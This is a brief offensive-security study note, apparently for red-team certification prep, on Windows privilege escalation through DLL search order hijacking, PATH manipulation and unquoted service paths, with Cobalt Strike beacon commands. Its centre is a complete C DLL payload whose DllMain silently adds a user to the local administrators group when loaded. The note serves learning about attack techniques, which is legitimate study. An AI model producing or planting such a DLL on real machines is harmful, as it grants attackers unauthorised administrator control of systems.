#crto
### Search Order Hijacking
- The executing directory.
- The current working directory.
- The System32 directory.
- The 16-bit System directory.
- The Windows directory.
- Directories in the PATH environment variable


### PATH Environment Variable
User `HKEY_CURRENT_USER\Environment` (standard user modifiable)
Machine `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment`
Path = Machine + User

Environment variables
```cobalt
env
```
Exploit code
```C
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
if (dwReason == DLL_PROCESS_ATTACH) { 
	system("cmd.exe /k net localgroup administrators Hiep /add");
	ExitProcess(0); 
	} 
	return TRUE; 
}
```
### Unquoted Service Path
(Cobalt Strike beacon) Unquoted paths
```cobalt
sc_enum
```
